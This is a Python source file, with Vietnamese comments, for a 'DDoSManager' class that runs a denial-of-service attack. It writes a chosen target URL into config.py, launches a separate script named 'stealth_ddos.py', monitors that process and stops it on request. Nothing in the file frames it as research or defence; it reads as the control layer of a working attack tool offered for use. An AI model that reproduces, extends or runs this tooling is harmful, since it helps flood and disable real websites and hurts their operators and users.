import subprocess
import threading
import time
import os
import signal
import psutil
from datetime import datetime

class DDoSManager:
    def __init__(self):
        self.current_process = None
        self.current_target = None
        self.is_running = False
        self.start_time = None
        self.stats = {
            'requests_sent': 0,
            'uptime': 0,
            'target_url': None
        }
        
    def start_attack(self, target_url, script_name='stealth_ddos.py'):
        """Bắt đầu tấn công DDoS"""
        if self.is_running:
            self.stop_attack()
            time.sleep(2)  # Đợi process cũ dừng hoàn toàn
        
        try:
            # Cập nhật TARGET_URL trong config.py
            config_updated = self.update_config_target(target_url)
            if not config_updated:
                print("⚠️ Warning: Could not update config.py")
            
            # Kiểm tra script tồn tại
            if not os.path.exists(script_name):
                print(f"❌ Script not found: {script_name}")
                return False
            
            print(f"🚀 Starting DDoS process: python {script_name}")
            
            # Khởi động process DDoS với working directory
            self.current_process = subprocess.Popen(
                ['python', script_name],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=os.getcwd(),  # Set working directory
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if os.name == 'nt' else 0
            )
            
            # Đợi một chút để kiểm tra process có start thành công không
            time.sleep(1)
            
            if self.current_process.poll() is not None:
                # Process đã thoát
                stdout, stderr = self.current_process.communicate()
                print(f"❌ Process exited immediately!")
                print(f"STDOUT: {stdout.decode('utf-8', errors='ignore')}")
                print(f"STDERR: {stderr.decode('utf-8', errors='ignore')}")
                self.current_process = None
                return False
            
            self.current_target = target_url
            self.is_running = True
            self.start_time = datetime.now()
            self.stats['target_url'] = target_url
            
            print(f"✅ DDoS attack started for {target_url} (PID: {self.current_process.pid})")
            
            # Start monitoring thread
            monitor_thread = threading.Thread(target=self._monitor_process, daemon=True)
            monitor_thread.start()
            
            return True
            
        except Exception as e:
            print(f"❌ Failed to start DDoS attack: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def stop_attack(self):
        """Dừng tấn công DDoS"""
        if not self.is_running or not self.current_process:
            return True
        
        try:
            # Terminate process và tất cả child processes
            if os.name == 'nt':  # Windows
                subprocess.run(['taskkill', '/F', '/T', '/PID', str(self.current_process.pid)], 
                             capture_output=True)
            else:  # Unix/Linux
                os.killpg(os.getpgid(self.current_process.pid), signal.SIGTERM)
            
            # Đợi process dừng
            try:
                self.current_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.current_process.kill()
            
            self.current_process = None
            self.current_target = None
            self.is_running = False
            self.start_time = None
            
            print("🛑 DDoS attack stopped")
            return True
            
        except Exception as e:
            print(f"❌ Failed to stop DDoS attack: {e}")
            return False
    
    def update_config_target(self, target_url):
        """Cập nhật TARGET_URL trong config.py"""
        config_file = 'config.py'
        if not os.path.exists(config_file):
            return False
        
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Thay thế TARGET_URL
            import re
            pattern = r'TARGET_URL\s*=\s*["\'][^"\']*["\']'
            new_line = f'TARGET_URL = "{target_url}"'
            
            if re.search(pattern, content):
                new_content = re.sub(pattern, new_line, content)
                
                with open(config_file, 'w', encoding='utf-8') as f:
                    f.write(new_content)
                return True
        except Exception as e:
            print(f"❌ Failed to update config: {e}")
        
        return False
    
    def _monitor_process(self):
        """Monitor DDoS process health"""
        while self.is_running and self.current_process:
            try:
                # Kiểm tra process còn sống không
                if self.current_process.poll() is not None:
                    # Process đã chết
                    stdout, stderr = self.current_process.communicate()
                    print(f"⚠️ DDoS process died unexpectedly!")
                    print(f"Exit code: {self.current_process.returncode}")
                    if stderr:
                        print(f"Error: {stderr.decode('utf-8', errors='ignore')}")
                    
                    # Reset trạng thái
                    self.current_process = None
                    self.current_target = None
                    self.is_running = False
                    self.start_time = None
                    break
                
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                print(f"❌ Monitor error: {e}")
                break
    
    def get_status(self):
        """Lấy trạng thái hiện tại"""
        if not self.is_running:
            return {
                'running': False,
                'target': None,
                'uptime': 0,
                'pid': None
            }
        
        uptime = 0
        if self.start_time:
            uptime = int((datetime.now() - self.start_time).total_seconds())
        
        pid = self.current_process.pid if self.current_process else None
        
        return {
            'running': True,
            'target': self.current_target,
            'uptime': uptime,
            'pid': pid
        }
    
    def is_process_alive(self):
        """Kiểm tra process có còn sống không"""
        if not self.current_process:
            return False
        
        try:
            # Kiểm tra process status
            return self.current_process.poll() is None
        except:
            return False
    
    def get_process_info(self):
        """Lấy thông tin chi tiết về process"""
        if not self.current_process or not self.is_process_alive():
            return None
        
        try:
            process = psutil.Process(self.current_process.pid)
            return {
                'pid': process.pid,
                'cpu_percent': process.cpu_percent(),
                'memory_info': process.memory_info(),
                'create_time': process.create_time(),
                'status': process.status()
            }
        except:
            return None

# Global instance
ddos_manager = DDoSManager()